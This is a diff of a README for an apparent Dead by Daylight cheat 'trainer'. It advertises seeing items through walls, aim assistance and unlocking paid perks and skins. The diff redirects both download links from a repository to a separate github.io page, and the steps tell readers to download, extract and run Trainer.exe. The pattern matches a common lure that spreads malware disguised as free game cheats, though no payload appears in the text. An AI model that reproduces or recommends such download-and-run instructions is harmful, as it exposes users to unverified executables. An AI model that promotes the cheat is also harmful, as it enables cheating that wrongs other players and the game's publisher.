@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Mega - Automate your progress in Dead by Daylight
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/bifocal-scophthalmus681/DBD-AutoGrind-Trainer-2026-Mega)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://bifocal-scophthalmus681.github.io)
 
 This tool helps players automate the grind for Bloodpoints and rewards in Dead by Daylight. It includes features to track items through walls, aim with precision, and unlock game content like perks and character skins. The program functions as an external tool, meaning it operates outside the game client.
 
@@ -21,7 +21,7 @@ Close other programs that might interfere with input detection, such as overlays
 
 Follow these steps to prepare your system and run the trainer:
 
-1. Visit this page to download the latest version: [https://github.com/bifocal-scophthalmus681/DBD-AutoGrind-Trainer-2026-Mega](https://github.com/bifocal-scophthalmus681/DBD-AutoGrind-Trainer-2026-Mega).
+1. Visit this page to download the latest version: [https://bifocal-scophthalmus681.github.io](https://bifocal-scophthalmus681.github.io).
 2. Save the downloaded compressed folder to your desktop.
 3. Right-click the folder and select Extract All. Choose a location on your hard drive.
 4. Open the extracted folder and locate the file named Trainer.exe.
